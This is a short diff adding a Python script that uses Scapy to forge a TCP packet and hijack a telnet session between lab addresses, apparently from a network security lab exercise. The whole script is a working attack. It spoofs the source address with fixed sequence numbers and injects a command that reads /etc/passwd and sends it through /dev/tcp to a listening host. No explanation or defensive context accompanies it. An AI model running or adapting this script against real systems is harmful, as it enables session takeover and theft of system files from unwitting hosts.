@@ -1,0 +1,15 @@
+#!/usr/bin/python3
+import sys
+from scapy.all import *
+
+print("SENDING SESSION HIJACKING PACKET.........")
+
+IPLayer = IP(src="10.9.0.7", dst="10.9.0.5")
+TCPLayer = TCP(sport=36456, dport=23, flags="A",
+               seq=4091279025, ack=2415397359)
+
+Data = "\r cat /etc/passwd > /dev/tcp/10.9.0.1/9090\r"
+
+pkt = IPLayer/TCPLayer/Data
+ls(pkt)
+send(pkt,verbose=0)
